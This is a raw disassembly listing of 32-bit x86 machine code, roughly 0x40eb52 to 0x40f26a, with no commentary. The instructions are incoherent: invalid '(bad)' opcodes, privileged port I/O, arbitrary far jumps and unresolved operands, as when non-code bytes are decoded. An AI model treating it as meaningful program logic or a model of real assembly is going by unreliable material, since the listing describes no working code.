  40eb52:	lahf   
  40eb53:	add    ecx,ebp
  40eb55:	mov    esi,0xbe6a07c7
  40eb5a:	out    0x52,al
  40eb5c:	xor    al,BYTE PTR [edx+0x5b]
  40eb5f:	mov    edi,0x504cbe03
  40eb64:	test   eax,0x42afa2c8
  40eb69:	sbb    al,0xe6
  40eb6b:	cwde   
  40eb6c:	jnp    0x40eb31
  40eb6e:	mov    edi,0x627398b3
  40eb73:	out    dx,eax
  40eb74:	leave  
  40eb75:	shr    DWORD PTR [edi],cl
  40eb77:	pop    ebx
  40eb78:	pushf  
  40eb79:	aas    
  40eb7a:	mov    bl,0xda
  40eb7c:	sub    al,0x2c
  40eb7e:	les    ebx,FWORD PTR [ecx]
  40eb80:	ja     0x40ebaf
  40eb82:	retf   0x7d23
  40eb85:	(bad)  
  40eb88:	xchg   edx,eax
  40eb89:	neg    DWORD PTR [ebx+0x31]
  40eb8c:	xchg   esp,eax
  40eb8d:	rcr    DWORD PTR [ecx-0x52],cl
  40eb90:	retf   
  40eb91:	sbb    dl,0xa0
  40eb94:	jge    0x40ebd4
  40eb96:	cmc    
  40eb97:	fidivr WORD PTR [esi-0x48]
  40eb9a:	sti    
  40eb9b:	adc    edi,DWORD PTR ds:0xda3cec28
  40eba1:	mov    esp,0xe1d8553f
  40eba6:	(bad)  
  40eba7:	test   BYTE PTR [ebx-0x40ca6019],0xd
  40ebae:	mov    al,BYTE PTR [ecx-0x68]
  40ebb1:	xchg   esp,eax
  40ebb2:	ret    0xc1f1
  40ebb5:	push   ss
  40ebb6:	ins    BYTE PTR es:[edi],dx
  40ebb7:	sbb    DWORD PTR [eax],edx
  40ebb9:	jmp    0xd2a8:0x65afc65f
  40ebc0:	les    edx,FWORD PTR [esi-0x20]
  40ebc3:	lock xchg BYTE PTR [ebx],al
  40ebc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebc7:	cmp    ecx,edi
  40ebc9:	repnz icebp 
  40ebcb:	add    dl,bl
  40ebcd:	and    bl,ch
  40ebcf:	push   cs
  40ebd0:	in     eax,0x9c
  40ebd2:	pop    edi
  40ebd3:	popf   
  40ebd4:	leave  
  40ebd5:	or     dl,ah
  40ebd7:	adc    eax,0xcbd41d99
  40ebdd:	cmp    ebp,0xffffffa3
  40ebe0:	mov    ds:0xfd4c3064,al
  40ebe5:	pushf  
  40ebe6:	in     al,0xb4
  40ebe8:	scas   eax,DWORD PTR es:[edi]
  40ebe9:	(bad)  
  40ebea:	fwait
  40ebeb:	pop    es
  40ebec:	fdivr  QWORD PTR [ecx-0x157214b1]
  40ebf2:	cs cwde 
  40ebf4:	inc    edx
  40ebf5:	mov    ?,esp
  40ebf7:	es jecxz 0x40ec0c
  40ebfa:	out    dx,al
  40ebfb:	stos   BYTE PTR es:[edi],al
  40ebfc:	inc    ebx
  40ebfd:	repnz aas 
  40ebff:	rcl    DWORD PTR [ecx],0x43
  40ec02:	imul   edx,DWORD PTR [esi-0x7c0f457a],0xffffffd0
  40ec09:	loop   0x40ec56
  40ec0b:	pop    es
  40ec0c:	mov    esp,DWORD PTR [edi+ecx*4+0x11]
  40ec10:	and    eax,0x33bec188
  40ec15:	cmp    DWORD PTR [esi+0x5ebb527a],edi
  40ec1b:	out    0xd0,eax
  40ec1d:	je     0x40ec87
  40ec1f:	push   ebp
  40ec20:	mul    DWORD PTR [esp+edx*8-0x694648e]
  40ec27:	(bad)  
  40ec28:	in     eax,dx
  40ec29:	cmp    cl,BYTE PTR [edx]
  40ec2b:	das    
  40ec2c:	push   cs
  40ec2d:	xchg   DWORD PTR [ebp-0x2435c47e],esp
  40ec33:	jp     0x40ec0d
  40ec35:	aad    0xb5
  40ec37:	test   al,0x7d
  40ec39:	stos   DWORD PTR es:[edi],eax
  40ec3a:	jecxz  0x40ecaf
  40ec3c:	scas   al,BYTE PTR es:[edi]
  40ec3d:	(bad)  
  40ec3e:	arpl   di,di
  40ec40:	and    al,0x8c
  40ec42:	daa    
  40ec43:	add    esi,esi
  40ec45:	push   ds
  40ec46:	jne    0x40ec6d
  40ec48:	mov    eax,ds:0x93456a82
  40ec4d:	mov    DWORD PTR [ecx+0x1b],esi
  40ec50:	mov    edi,0x216d7c29
  40ec55:	adc    BYTE PTR [ecx],al
  40ec57:	retf   
  40ec58:	push   cs
  40ec59:	push   ecx
  40ec5a:	xor    BYTE PTR [edi],cl
  40ec5c:	or     al,0x95
  40ec5e:	mov    al,0xea
  40ec60:	cdq    
  40ec61:	inc    eax
  40ec62:	dec    esi
  40ec63:	lahf   
  40ec64:	fstp   DWORD PTR [esi]
  40ec66:	scas   eax,DWORD PTR es:[edi]
  40ec67:	mov    edi,DWORD PTR [eax]
  40ec69:	jnp    0x40ec14
  40ec6b:	adc    al,cl
  40ec6d:	inc    edx
  40ec6e:	test   DWORD PTR [ebx+0x26],edx
  40ec71:	adc    ebx,eax
  40ec73:	outs   dx,DWORD PTR ds:[esi]
  40ec74:	mov    fs,WORD PTR [ecx-0x19]
  40ec77:	pop    ds
  40ec78:	xor    al,0x84
  40ec7a:	dec    edi
  40ec7b:	add    BYTE PTR [edx],ah
  40ec7d:	pop    ebx
  40ec7e:	(bad)
  40ec81:	div    DWORD PTR [ecx]
  40ec83:	jle    0x4a9841de
  40ec89:	xor    eax,DWORD PTR [ecx]
  40ec8b:	xchg   ebx,eax
  40ec8c:	std    
  40ec8d:	int    0xcb
  40ec8f:	add    dl,cl
  40ec91:	sbb    ch,BYTE PTR [edi-0x47046fae]
  40ec97:	and    BYTE PTR [esi+0xb78df69],0x2d
  40ec9e:	xor    BYTE PTR [ebx+0x7],0x8e
  40eca2:	test   al,0x84
  40eca4:	and    dh,BYTE PTR [edx+0x6a455db1]
  40ecaa:	gs fsubp st(6),st
  40ecad:	lahf   
  40ecae:	xchg   edi,eax
  40ecaf:	cmp    cl,ch
  40ecb1:	je     0x40ecdd
  40ecb3:	sub    DWORD PTR [esi],ebp
  40ecb5:	pusha  
  40ecb6:	pop    eax
  40ecb7:	xlat   BYTE PTR ds:[ebx]
  40ecb8:	loopne 0x40ec49
  40ecba:	jmp    0x40ecfb
  40ecbc:	and    BYTE PTR [ebp+0x7c],0xe7
  40ecc0:	or     BYTE PTR [ecx+0x4429a6f1],al
  40ecc6:	and    al,0xe7
  40ecc8:	inc    edi
  40ecc9:	mov    ebp,DWORD PTR [ebx+ecx*4]
  40eccc:	push   ds
  40eccd:	mov    al,0x5
  40eccf:	mov    al,ds:0xea156441
  40ecd4:	xor    edi,DWORD PTR [eax+0x13]
  40ecd7:	fwait
  40ecd8:	jb     0x40ed3e
  40ecda:	dec    esi
  40ecdb:	or     BYTE PTR [esi-0x3e98bc09],bh
  40ece1:	outs   dx,DWORD PTR ds:[esi]
  40ece2:	xchg   ebx,eax
  40ece3:	pop    edx
  40ece4:	mov    eax,ds:0xd73e69f7
  40ece9:	mov    DWORD PTR [ebp-0x673bbe34],ebx
  40ecef:	inc    ecx
  40ecf0:	jmp    0xfee7bb03
  40ecf5:	or     ecx,DWORD PTR [esi+0x65]
  40ecf8:	frstor [edx+0x3071ecd5]
  40ecfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecff:	rcl    ah,cl
  40ed01:	mov    ebp,0x4d7b3016
  40ed06:	add    DWORD PTR [eax],edx
  40ed08:	mov    bl,0xda
  40ed0a:	test   DWORD PTR [eax],esp
  40ed0c:	stos   DWORD PTR es:[edi],eax
  40ed0d:	dec    ebp
  40ed0e:	xchg   edx,eax
  40ed0f:	out    0xc2,eax
  40ed11:	mov    al,ds:0x19dd598e
  40ed16:	push   es
  40ed17:	dec    esi
  40ed18:	push   esp
  40ed19:	mov    bh,0x8f
  40ed1b:	shr    DWORD PTR [eax],1
  40ed1d:	retf   0x6ef1
  40ed20:	out    0x7c,al
  40ed22:	sbb    eax,0xe9573978
  40ed27:	cmp    DWORD PTR [esi],edx
  40ed29:	or     ah,BYTE PTR [esi]
  40ed2b:	cmp    cl,cl
  40ed2d:	addr16 push edx
  40ed2f:	inc    eax
  40ed30:	mov    DWORD PTR [ebx],0xdecd5a13
  40ed36:	and    DWORD PTR ds:0x87afa39b,eax
  40ed3c:	xor    al,0x34
  40ed3e:	mov    al,0x6f
  40ed40:	sbb    esi,ecx
  40ed42:	imul   ebp,DWORD PTR [ecx+eax*8],0x2427f601
  40ed49:	icebp  
  40ed4a:	in     eax,0x20
  40ed4c:	cmp    DWORD PTR [esp+ebp*4],esp
  40ed4f:	dec    esi
  40ed50:	cmp    DWORD PTR [eax+0x46],esi
  40ed53:	dec    ebx
  40ed54:	loop   0x40ed6b
  40ed56:	std    
  40ed57:	xor    al,BYTE PTR [edi+ebx*2+0x74]
  40ed5b:	add    DWORD PTR [ebx-0x1c32b77b],edx
  40ed61:	fsubrp st(2),st
  40ed63:	mov    DWORD PTR es:[edi-0x38],esp
  40ed67:	mov    ch,0x3a
  40ed69:	push   es
  40ed6a:	inc    esi
  40ed6b:	pop    ebx
  40ed6c:	(bad)  
  40ed6d:	fs dec edi
  40ed6f:	sub    cl,ch
  40ed71:	hlt    
  40ed72:	push   edi
  40ed73:	xchg   esp,eax
  40ed74:	or     al,0xe5
  40ed76:	jns    0x40edbd
  40ed78:	(bad)  
  40ed79:	int    0xb2
  40ed7b:	mov    dh,0xb9
  40ed7d:	imul   esp,eax,0x2cd6e9b7
  40ed83:	ja     0x40ed39
  40ed85:	add    al,0x71
  40ed87:	mov    esi,0x34291b01
  40ed8c:	pop    ss
  40ed8d:	out    dx,eax
  40ed8e:	mov    ds:0x84b3bd3,al
  40ed93:	sbb    DWORD PTR [ebx+0x33],edx
  40ed96:	jmp    0xf95f:0x8237a0dd
  40ed9d:	fdivr  DWORD PTR [ebp+edx*8+0x1a2470d2]
  40eda4:	aaa    
  40eda5:	cmp    edx,ebp
  40eda7:	add    eax,0xeb5de43a
  40edac:	cwde   
  40edad:	xlat   BYTE PTR ds:[ebx]
  40edae:	and    al,0x17
  40edb0:	push   esi
  40edb1:	pop    esi
  40edb2:	in     al,dx
  40edb3:	xor    eax,0xece0293f
  40edb8:	into   
  40edb9:	xlat   BYTE PTR ds:[ebx]
  40edba:	les    edi,FWORD PTR ds:0x37e0a1da
  40edc0:	loopne 0x40ee3f
  40edc2:	push   0xbe797893
  40edc7:	push   edx
  40edc8:	xor    BYTE PTR [ebp-0x664ffac4],al
  40edce:	xchg   ecx,eax
  40edcf:	repnz (bad) 
  40edd1:	hlt    
  40edd2:	lods   al,BYTE PTR ds:[esi]
  40edd3:	push   0xd1e181b4
  40edd8:	mov    bl,0x9
  40edda:	(bad)  [ecx-0x79e395f7]
  40ede0:	in     al,dx
  40ede1:	shl    DWORD PTR [edx+0x2b635d35],1
  40ede7:	cs loope 0x40ee00
  40edea:	arpl   WORD PTR [eax+0x65],bx
  40eded:	and    BYTE PTR [esi+0x224d6bd7],dl
  40edf3:	mov    ?,WORD PTR [esi+edx*4-0x29]
  40edf7:	pop    esi
  40edf8:	adc    edx,0xc
  40edfb:	xor    esi,DWORD PTR [edi-0x59668730]
  40ee01:	aam    0x28
  40ee03:	ret    
  40ee04:	mov    BYTE PTR [edi+0x12],dh
  40ee07:	mov    al,ds:0x1ba85bcb
  40ee0c:	xchg   edi,eax
  40ee0d:	cmp    BYTE PTR [esp+ecx*8-0x41],dh
  40ee11:	mul    DWORD PTR cs:[ebx+0x5a25f8fb]
  40ee18:	sbb    eax,eax
  40ee1a:	call   0x18d02a41
  40ee1f:	mov    BYTE PTR [ebx],ch
  40ee21:	xchg   esp,eax
  40ee22:	outs   dx,DWORD PTR ds:[esi]
  40ee23:	fs sahf 
  40ee25:	stos   BYTE PTR es:[edi],al
  40ee26:	push   es
  40ee27:	dec    esp
  40ee28:	pop    ebx
  40ee29:	sbb    DWORD PTR [ebp-0x7f],eax
  40ee2c:	imul   ebx,DWORD PTR [edx],0x9ed861e2
  40ee32:	(bad)  
  40ee33:	in     eax,0x6
  40ee35:	cdq    
  40ee36:	and    ah,BYTE PTR [edx]
  40ee38:	outs   dx,BYTE PTR ds:[esi]
  40ee39:	and    ch,BYTE PTR [ecx]
  40ee3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee3c:	push   ss
  40ee3d:	inc    eax
  40ee3e:	xor    dl,BYTE PTR [ebp+0x1bfc2c4f]
  40ee44:	pop    esi
  40ee45:	cmp    al,0x55
  40ee47:	cdq    
  40ee48:	adc    bl,dl
  40ee4a:	inc    ebx
  40ee4b:	in     eax,dx
  40ee4c:	dec    ebx
  40ee4d:	push   ds
  40ee4e:	pop    edi
  40ee4f:	mov    eax,ds:0x1ccc948e
  40ee54:	add    DWORD PTR [edi+esi*2+0x3872ed73],esi
  40ee5b:	adc    bh,BYTE PTR [ebx-0x5f991426]
  40ee61:	daa    
  40ee62:	in     eax,dx
  40ee63:	imul   edi,DWORD PTR [esi+0x2a5f3609],0xffffffe4
  40ee6a:	jbe    0x40edf3
  40ee6c:	inc    esi
  40ee6d:	ss sub eax,0x9dac5ba9
  40ee73:	or     cl,BYTE PTR [esi-0x1fe2623]
  40ee79:	into   
  40ee7a:	leave  
  40ee7b:	sub    al,0x53
  40ee7d:	sbb    edi,DWORD PTR [edx-0x6c1e5101]
  40ee83:	mov    bh,0x5
  40ee85:	jne    0x40ee21
  40ee87:	pusha  
  40ee88:	and    DWORD PTR [edx+0x205ffdb9],ecx
  40ee8e:	dec    esp
  40ee8f:	mov    DWORD PTR ds:0xa75a1cd5,ebp
  40ee95:	pop    ebx
  40ee96:	mov    edx,0x63ae065a
  40ee9b:	lahf   
  40ee9c:	xchg   ebx,eax
  40ee9d:	or     al,0x8a
  40ee9f:	mov    al,0xa0
  40eea1:	je     0x40ee4c
  40eea3:	popa   
  40eea4:	stos   DWORD PTR es:[edi],eax
  40eea5:	xchg   ebp,eax
  40eea6:	cmp    bh,BYTE PTR [edx-0x39]
  40eea9:	inc    ebx
  40eeaa:	add    dl,BYTE PTR [eax+esi*8-0xa]
  40eeae:	dec    ebx
  40eeaf:	clc    
  40eeb0:	push   ds
  40eeb1:	dec    ebp
  40eeb2:	repz push esi
  40eeb4:	ja     0x40ef18
  40eeb6:	outs   dx,DWORD PTR ds:[si]
  40eeb8:	in     al,0xc6
  40eeba:	push   ebx
  40eebb:	int3   
  40eebc:	fsub   QWORD PTR [edx-0x7b]
  40eebf:	cmp    edx,eax
  40eec1:	mov    ebx,0xf2567ca8
  40eec6:	and    al,0x49
  40eec8:	test   al,0x2b
  40eeca:	repz retf 
  40eecc:	xchg   esp,eax
  40eecd:	lods   eax,DWORD PTR ds:[esi]
  40eece:	(bad)  
  40eecf:	int    0xdb
  40eed1:	mov    eax,0x59f55b93
  40eed6:	push   ss
  40eed7:	push   ebp
  40eed8:	and    BYTE PTR [ebx+edi*8+0xe6f76b5],ah
  40eedf:	push   cs
  40eee0:	sub    cl,cl
  40eee2:	out    dx,eax
  40eee3:	fsubr  DWORD PTR [edx+eiz*8+0xb]
  40eee7:	or     cl,BYTE PTR [ecx]
  40eee9:	xchg   ebp,eax
  40eeea:	aaa    
  40eeeb:	fdivr  st,st(7)
  40eeed:	cmp    al,0xd4
  40eeef:	mov    ch,0x5e
  40eef1:	jno    0x40ee78
  40eef3:	cli    
  40eef4:	leave  
  40eef5:	cmp    BYTE PTR ss:[esi-0x2a],0x0
  40eefa:	xchg   ebx,eax
  40eefb:	ficom  WORD PTR [ebx+ecx*8+0x4e]
  40eeff:	mov    edi,edx
  40ef01:	int    0xdd
  40ef03:	jb     0x40ef08
  40ef05:	cmp    DWORD PTR [eax],edi
  40ef07:	fdivr  QWORD PTR [esi]
  40ef09:	cli    
  40ef0a:	cli    
  40ef0b:	out    dx,al
  40ef0c:	daa    
  40ef0d:	sbb    BYTE PTR [ecx],cl
  40ef0f:	fsubr  st,st(2)
  40ef11:	and    al,0x5e
  40ef13:	adc    BYTE PTR [eax],ch
  40ef15:	cmp    eax,0xdac960cd
  40ef1a:	bound  esp,QWORD PTR [ebx-0x5d]
  40ef1d:	hlt    
  40ef1e:	cmp    al,0xf1
  40ef20:	pop    ss
  40ef21:	jo     0x40ef0f
  40ef23:	mov    ah,0x96
  40ef25:	aaa    
  40ef26:	mov    cl,0xed
  40ef28:	pop    ds
  40ef29:	jecxz  0x40ef78
  40ef2b:	jecxz  0x40ef4b
  40ef2d:	cmp    ebx,ecx
  40ef2f:	cmp    BYTE PTR [edi+0x5c],dh
  40ef32:	lahf   
  40ef33:	pop    esi
  40ef34:	sub    BYTE PTR [ecx+0x79bb7696],bh
  40ef3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef3b:	inc    edi
  40ef3c:	add    DWORD PTR [ebp-0x1709d92f],0x6c
  40ef43:	cmp    DWORD PTR [eax+ebp*1+0x3b],esp
  40ef47:	clc    
  40ef48:	(bad)  
  40ef49:	stc    
  40ef4a:	xchg   ecx,eax
  40ef4b:	mov    WORD PTR [ecx+0x5d],ds
  40ef4e:	push   esp
  40ef4f:	cmp    eax,0xef303919
  40ef54:	sti    
  40ef55:	add    DWORD PTR [ebx+eiz*4],esi
  40ef58:	inc    ebx
  40ef59:	mov    bh,0xc8
  40ef5b:	add    eax,0x3c2e4a29
  40ef60:	jo     0x40ef61
  40ef62:	mov    ecx,eax
  40ef64:	mov    ebx,0xdcfb9d45
  40ef69:	jns    0x40ef75
  40ef6b:	dec    edi
  40ef6c:	or     BYTE PTR [esi-0x72],dl
  40ef6f:	mov    eax,0x2e85f5cf
  40ef74:	sub    al,0x5c
  40ef76:	(bad)  
  40ef77:	lods   al,BYTE PTR ds:[esi]
  40ef78:	call   0xc2853eb9
  40ef7d:	sbb    DWORD PTR [eax-0x19102506],edx
  40ef83:	push   esi
  40ef84:	xchg   ebx,eax
  40ef85:	in     eax,0x14
  40ef87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef88:	pusha  
  40ef89:	stc    
  40ef8a:	mov    bl,0x9a
  40ef8c:	fldenv [ebx-0x2b]
  40ef8f:	mov    ch,0x2e
  40ef91:	xchg   DWORD PTR [edx],edx
  40ef93:	dec    ecx
  40ef94:	leave  
  40ef95:	sbb    bl,BYTE PTR ds:0x19ebe5a7
  40ef9b:	pop    es
  40ef9c:	shr    DWORD PTR [ecx+0x3a645e74],cl
  40efa2:	and    DWORD PTR [esi+0x35],eax
  40efa5:	sti    
  40efa6:	js     0x40ef82
  40efa8:	and    BYTE PTR [ebx-0x77f5045c],bl
  40efae:	mov    eax,0x24c921d7
  40efb3:	mov    ah,0x92
  40efb5:	mov    esp,0x5c91ea3e
  40efba:	fdiv   DWORD PTR [ecx-0x74]
  40efbd:	(bad)  
  40efbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efbf:	jnp    0x40ef5a
  40efc1:	mov    ah,0xb3
  40efc3:	inc    esp
  40efc4:	cmp    al,BYTE PTR ds:0xdd319e76
  40efca:	and    edi,DWORD PTR [edx+0x25cf5217]
  40efd0:	je     0x40efae
  40efd2:	xor    ah,BYTE PTR [edi]
  40efd4:	lea    eax,[esi-0x75d6fc8]
  40efda:	xchg   ebx,eax
  40efdb:	sbb    eax,0x824a9faf
  40efe0:	fsubp  st(7),st
  40efe2:	jp     0x40eff3
  40efe4:	cmp    eax,0x58f631bb
  40efe9:	cmp    BYTE PTR [ebx-0x13],bh
  40efec:	add    bl,ch
  40efee:	pop    eax
  40efef:	fistp  WORD PTR [eax]
  40eff1:	(bad)  
  40eff2:	mov    ebx,0x7cd61592
  40eff7:	repnz xchg ebp,eax
  40eff9:	lods   eax,DWORD PTR ds:[esi]
  40effa:	cmp    bl,cl
  40effc:	clc    
  40effd:	sub    eax,0x410df971
  40f002:	sahf   
  40f003:	(bad)
  40f008:	data16 daa 
  40f00a:	out    dx,eax
  40f00b:	and    al,0xa9
  40f00d:	pop    ebp
  40f00e:	push   es
  40f00f:	sub    eax,0xff0d30c1
  40f014:	or     DWORD PTR [eax],0xffffff84
  40f017:	jp     0x40efd1
  40f019:	cdq    
  40f01a:	lods   eax,DWORD PTR ds:[esi]
  40f01b:	or     DWORD PTR [ecx-0x14],ebp
  40f01e:	nop
  40f01f:	jg     0x40f045
  40f021:	mov    ebx,0x285a9f0a
  40f026:	leave  
  40f027:	lods   eax,DWORD PTR ds:[esi]
  40f028:	sti    
  40f029:	mov    al,0xa1
  40f02b:	mov    dh,0x5c
  40f02d:	(bad)  
  40f02e:	hlt    
  40f02f:	sbb    eax,0x917260e6
  40f034:	ror    BYTE PTR [esi+0xb38dfd6],0x1
  40f03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f03c:	dec    edx
  40f03d:	outs   dx,DWORD PTR ds:[esi]
  40f03e:	(bad)  
  40f040:	jne    0x40efc2
  40f042:	xor    cl,BYTE PTR ds:0x86978d12
  40f048:	adc    eax,0x29c9758e
  40f04d:	push   ecx
  40f04e:	xchg   ecx,eax
  40f04f:	mov    esp,esp
  40f051:	jmp    0x9446:0xbdad0ca2
  40f058:	(bad)  
  40f059:	jae    0x40f092
  40f05b:	xor    DWORD PTR [eax+0x32],ecx
  40f05e:	mov    ds:0xe93e93be,al
  40f063:	iret   
  40f064:	dec    eax
  40f065:	rcr    DWORD PTR [ecx+esi*2+0x79e10389],cl
  40f06c:	push   es
  40f06d:	mov    eax,0x8dc10633
  40f072:	mov    ah,0x3
  40f074:	dec    eax
  40f075:	jmp    0xdb7d:0xaaf5c0cb
  40f07c:	gs dec edi
  40f07e:	pop    eax
  40f07f:	ins    BYTE PTR es:[edi],dx
  40f080:	and    al,0x41
  40f082:	adc    bh,bl
  40f084:	stos   BYTE PTR es:[edi],al
  40f085:	dec    eax
  40f086:	xchg   esp,eax
  40f087:	cwde   
  40f088:	ret    
  40f089:	fcmovu st,st(1)
  40f08b:	and    eax,esi
  40f08d:	es push esp
  40f08f:	dec    ecx
  40f090:	add    eax,0xda797ba3
  40f095:	xchg   ecx,eax
  40f096:	lods   eax,DWORD PTR ds:[esi]
  40f097:	mov    al,0x65
  40f099:	or     DWORD PTR [esi+0x4b4f91d2],0x3f6b3ec7
  40f0a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0a4:	push   ecx
  40f0a5:	int    0xc8
  40f0a7:	jle    0x40f09d
  40f0a9:	fwait
  40f0aa:	push   0x24
  40f0ac:	outs   dx,BYTE PTR ds:[esi]
  40f0ad:	mov    bh,0xc0
  40f0af:	dec    esp
  40f0b0:	mov    dh,0xaf
  40f0b2:	sub    bh,dl
  40f0b4:	jp     0x40f0c3
  40f0b6:	stc    
  40f0b7:	adc    ah,dh
  40f0b9:	cli    
  40f0ba:	or     al,0x1a
  40f0bc:	cmp    eax,0x6a13d50d
  40f0c2:	test   eax,0xa7f39ffe
  40f0c7:	cmp    ebp,ebp
  40f0c9:	xchg   DWORD PTR ds:0x200de38a,eax
  40f0cf:	jge    0x40f124
  40f0d1:	mov    WORD PTR [edx],cs
  40f0d3:	xchg   eax,ecx
  40f0d5:	jge    0x40f0cd
  40f0d7:	or     ecx,ecx
  40f0d9:	mov    ebx,0xf63e2870
  40f0de:	add    al,0xe1
  40f0e0:	call   0xd2e54094
  40f0e5:	ja     0x40f0ad
  40f0e7:	adc    ebp,edi
  40f0e9:	dec    edx
  40f0ea:	mov    esi,ecx
  40f0ec:	fwait
  40f0ed:	test   BYTE PTR [edi+ecx*2+0x489b2b3f],al
  40f0f4:	outs   dx,BYTE PTR ds:[esi]
  40f0f5:	outs   dx,DWORD PTR ds:[esi]
  40f0f6:	dec    ebp
  40f0f7:	xor    esp,DWORD PTR [ecx-0x27aea419]
  40f0fd:	or     DWORD PTR [esi],esi
  40f0ff:	mov    ch,0x88
  40f101:	cmp    bl,BYTE PTR [ecx]
  40f103:	and    BYTE PTR [ebp-0x7b],dh
  40f106:	je     0x40f11f
  40f108:	test   cl,al
  40f10a:	out    dx,eax
  40f10b:	fild   DWORD PTR [edx+edx*2-0x97829bb]
  40f112:	dec    esp
  40f113:	and    BYTE PTR [eax+edi*1],dh
  40f116:	cdq    
  40f117:	sbb    edx,eax
  40f119:	mov    eax,ds:0xc4e39fa1
  40f11e:	leave  
  40f11f:	or     ebp,DWORD PTR [eax-0x34f5be49]
  40f125:	(bad)  
  40f126:	push   esi
  40f127:	shl    BYTE PTR [ecx-0x2c],cl
  40f12a:	retf   0x43de
  40f12d:	ror    DWORD PTR [esi+ebp*4+0x60],0x56
  40f132:	dec    edx
  40f133:	or     BYTE PTR [esi-0x60],ah
  40f136:	fisub  DWORD PTR [edi+eiz*8-0x13081cce]
  40f13d:	aam    0xaa
  40f13f:	mov    ch,0x43
  40f141:	out    dx,al
  40f142:	inc    ebp
  40f143:	jle    0x40f138
  40f145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f146:	lea    edi,[ecx]
  40f148:	ins    BYTE PTR es:[edi],dx
  40f149:	cmp    dl,bh
  40f14b:	or     cl,bh
  40f14d:	out    dx,al
  40f14e:	mov    al,ds:0x7aff98e7
  40f153:	jp     0x40f1d0
  40f155:	fstp   DWORD PTR [ebp-0x6f]
  40f158:	ret    
  40f159:	and    al,0x7d
  40f15b:	loope  0x40f164
  40f15d:	std    
  40f15e:	fidivr WORD PTR [esi-0x628b7963]
  40f164:	add    edx,ebp
  40f166:	sbb    BYTE PTR [edx],ch
  40f168:	xchg   BYTE PTR [eax-0x2391537d],ch
  40f16e:	mov    ah,BYTE PTR ds:[esp+eax*4]
  40f172:	jle    0x40f17c
  40f174:	mov    esp,0x9ed47224
  40f179:	ret    0xf3f8
  40f17c:	push   cs
  40f17d:	inc    edx
  40f17e:	dec    ecx
  40f17f:	xlat   BYTE PTR ds:[ebx]
  40f180:	mov    ?,edi
  40f182:	(bad)
  40f187:	sar    DWORD PTR [eax],0x39
  40f18a:	push   edi
  40f18b:	pop    ebx
  40f18c:	lods   eax,DWORD PTR ds:[esi]
  40f18d:	mov    ds:0x7f9964f4,eax
  40f192:	cmp    edi,DWORD PTR [ecx-0x48]
  40f195:	xlat   BYTE PTR ds:[ebx]
  40f196:	or     DWORD PTR [ebx],ebx
  40f198:	mov    gs,WORD PTR [eax+0x3e447bd0]
  40f19e:	adc    DWORD PTR [edi-0x7f],esi
  40f1a1:	cs push es
  40f1a3:	leave  
  40f1a4:	mov    ah,BYTE PTR [ebx-0x234ec195]
  40f1aa:	ins    BYTE PTR es:[edi],dx
  40f1ab:	cmp    esi,esp
  40f1ad:	xor    al,0xbb
  40f1af:	add    cl,ah
  40f1b1:	sbb    eax,0x4c504f4b
  40f1b6:	cli    
  40f1b7:	fiadd  DWORD PTR [ecx-0x1c1a6e4]
  40f1bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1be:	out    dx,eax
  40f1bf:	ins    BYTE PTR es:[edi],dx
  40f1c0:	pop    eax
  40f1c1:	push   edx
  40f1c2:	ret    
  40f1c3:	jp     0x40f1b5
  40f1c5:	cld    
  40f1c6:	xor    BYTE PTR [ebx+0x60],dl
  40f1c9:	cs (bad) 
  40f1cb:	dec    ebp
  40f1cd:	xor    ah,BYTE PTR [edi+esi*4]
  40f1d0:	jp     0x40f1dd
  40f1d2:	pop    eax
  40f1d3:	mov    cl,0xca
  40f1d5:	jae    0x40f176
  40f1d7:	push   ebp
  40f1d8:	xchg   ebp,eax
  40f1d9:	aad    0x30
  40f1db:	stc    
  40f1dc:	fmul   QWORD PTR [ebx]
  40f1de:	scas   al,BYTE PTR es:[edi]
  40f1df:	cli    
  40f1e0:	std    
  40f1e1:	inc    eax
  40f1e2:	pop    ds
  40f1e3:	or     eax,0xeef214d7
  40f1e8:	fnstcw WORD PTR [ebx-0x5dc328e0]
  40f1ee:	lods   al,BYTE PTR ds:[esi]
  40f1ef:	add    eax,0x63c419cf
  40f1f4:	repnz scas eax,DWORD PTR es:[edi]
  40f1f6:	inc    edx
  40f1f7:	jl     0x40f1eb
  40f1f9:	or     ch,BYTE PTR [edx-0x49827d1b]
  40f1ff:	mov    WORD PTR [edi],fs
  40f201:	add    esi,esi
  40f203:	mov    ?,WORD PTR [edi-0x4d]
  40f206:	dec    ecx
  40f207:	ss nop
  40f209:	mov    WORD PTR [edi-0x29],?
  40f20c:	mov    ebx,0xbdbe3482
  40f211:	xchg   edx,eax
  40f212:	(bad)  
  40f213:	fist   DWORD PTR [ecx]
  40f215:	imul   edi,DWORD PTR [ecx+0x3fc023ef],0xffffff95
  40f21c:	sub    BYTE PTR [esi],bl
  40f21e:	test   BYTE PTR [ebx-0x162f6320],bh
  40f224:	sbb    BYTE PTR [eax],ch
  40f226:	jbe    0x40f1b5
  40f228:	dec    eax
  40f229:	sub    dl,BYTE PTR [edi-0x43]
  40f22c:	fcom   st(2)
  40f22e:	mov    al,ds:0x840d6cb5
  40f233:	icebp  
  40f234:	out    dx,eax
  40f235:	lods   al,BYTE PTR ds:[esi]
  40f236:	es leave 
  40f238:	out    0xa7,al
  40f23a:	sbb    BYTE PTR [esi+0x40],al
  40f23d:	call   0x96c1:0x97cc9dd2
  40f244:	jmp    0x40f278
  40f246:	ds mov ebx,ecx
  40f249:	push   ds
  40f24a:	mov    eax,eax
  40f24c:	aas    
  40f24d:	cmp    al,0x7
  40f24f:	aad    0x9f
  40f251:	cmc    
  40f252:	daa    
  40f253:	outs   dx,DWORD PTR ds:[esi]
  40f254:	xor    DWORD PTR [esi+0x23],0xffffffb5
  40f258:	loop   0x40f2cc
  40f25a:	and    al,0xe2
  40f25c:	pushf  
  40f25d:	cmp    BYTE PTR [edi+0x2556f536],dh
  40f263:	out    0xb7,eax
  40f265:	cmp    eax,0x3905d07a
  40f26a:	push   edx
